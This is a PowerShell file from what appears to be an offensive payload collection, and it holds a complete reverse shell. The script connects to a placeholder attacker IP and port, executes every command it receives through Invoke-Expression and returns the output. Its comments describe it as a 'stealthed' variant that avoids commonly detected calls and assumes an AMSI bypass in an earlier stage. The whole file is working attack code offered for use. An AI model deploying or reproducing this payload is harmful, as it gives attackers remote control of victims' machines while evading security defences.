# payloads/windows/shell_reverse/raw.ps1

# Reverse shell (PowerShell) — 2025 stealthed variant
# Avoids IEX, WebClient, DownloadString, AMSI bypass is assumed in Stage 1

$client = New-Object System.Net.Sockets.TCPClient("REPLACE_IP", REPLACE_PORT)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object Byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

$writer.AutoFlush = $true
$writer.Write("[+] Connected`n")

while ($client.Connected) {
    $writer.Write("PS > ")
    $read = $stream.Read($buffer, 0, 1024)
    $cmd = $encoding.GetString($buffer, 0, $read).Trim()
    if ($cmd -eq "exit") { break }
    try {
        $output = (Invoke-Expression $cmd | Out-String)
    } catch {
        $output = $_.Exception.Message
    }
    $writer.WriteLine($output)
}

$writer.Close()
$client.Close()
